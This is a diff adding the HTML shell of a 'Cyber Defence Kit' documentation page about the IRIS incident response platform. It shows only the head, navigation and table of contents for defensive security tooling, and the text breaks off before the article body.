@@ -1,0 +1,2531 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../thehive/thehive.html">
+      
+      
+        <link rel="next" href="../understanding-SOAR/understanding-SOAR.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../images/Cyber Defence Kit logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>IRIS - Cyber Defence Kit</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="light-blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#iris" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="Cyber Defence Kit" class="md-header__button md-logo" aria-label="Cyber Defence Kit" data-md-component="logo">
+      
+  <img src="../images/Cyber Defence Kit logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Cyber Defence Kit
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              IRIS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="light-blue" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="light-blue" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-SIEM/understanding-SIEM.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  SIEM
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-IDS-IPS/understanding-IDS-IPS.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  IDS/IPS
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../understanding-SIRP/understanding-SIRP.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  SIRP
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-SOAR/understanding-SOAR.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  SOAR
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-NTA/understanding-NTA.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  NTA
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-DFIR/understanding-DFIR.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  DFIR
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-EDR/understanding-EDR.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  EDR
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../caldera/caldera.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  MITRE
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="Cyber Defence Kit" class="md-nav__button md-logo" aria-label="Cyber Defence Kit" data-md-component="logo">
+      
+  <img src="../images/Cyber Defence Kit logo.png" alt="logo">
+
+    </a>
+    Cyber Defence Kit
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SIEM
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SIEM
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-SIEM/understanding-SIEM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding SIEM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../splunk/splunk.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Splunk
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wazuh/wazuh.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wazuh
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../securityonion/securityonion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Onion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3">
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDS/IPS
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    IDS/IPS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-IDS-IPS/understanding-IDS-IPS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding IDS/IPS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../snort/snort.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Snort
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../suricata/suricata.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Suricata
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SIRP
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SIRP
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-SIRP/understanding-SIRP.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding SIRP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../thehive/thehive.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TheHive
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IRIS
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="iris.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IRIS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#lab-setup-for-proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab Setup for Proof of Concept
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installing-iris-in-an-air-gapped-environment-ubuntu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Installing IRIS in an Air-gapped Environment (Ubuntu)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-simulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Simulation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction-to-iris" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction to IRIS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Introduction to IRIS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#adding-a-customer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding a Customer
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-a-case" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating a Case
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adding-assets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding Assets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-a-timeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating a Timeline
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adding-evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding Evidence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#collaboration-and-access-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Collaboration and Access Management
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generating-a-report" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generating a Report
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#case-closure-and-database-backup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Closure and Database Backup
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5">
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SOAR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SOAR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-SOAR/understanding-SOAR.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding SOAR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shuffle/shuffle.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shuffle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6">
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTA
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NTA
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-NTA/understanding-NTA.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding NTA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wireshark/wireshark.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wireshark
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zeek/zeek.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Zeek
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zui/zui.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Zui
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7">
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DFIR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DFIR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-DFIR/understanding-DFIR.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding DFIR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../velociraptor/velociraptor.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Velociraptor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8">
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EDR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    EDR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-EDR/understanding-EDR.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding EDR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../auroralite/auroralite.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Aurora Lite
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9">
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MITRE
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../caldera/caldera.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Caldera
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../navigator/navigator.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE ATT&amp;CK Navigator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
